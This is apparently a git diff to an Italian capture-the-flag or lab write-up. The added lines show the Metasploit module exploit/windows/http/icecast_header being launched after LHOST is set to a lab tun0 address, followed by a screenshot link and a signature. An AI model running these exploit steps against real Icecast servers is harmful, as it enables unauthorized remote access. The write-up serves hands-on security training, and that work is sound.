@@ -108,8 +108,19 @@ Nel risultato della ricerca, il modulo di exploit è indicato con:
 exploit/windows/http/icecast_header
 ```
 
+Si imposta il valore di LHOST (indirizzo IP locale) con l’IP di tun0 con il comando 
+```
+set lhost 10.10.7.72
+```
+per poi concludere l'esploit con il comando
+```
+exploit
+```
+<img width="580" alt="Screenshot 2024-11-21 alle 17 22 48" src="https://github.com/user-attachments/assets/3176e4f6-6071-4c2d-bbf4-a25c3b8aa204">
 
 
+
+Nicoletta, Alessandra, Grazia <3
 
 
 
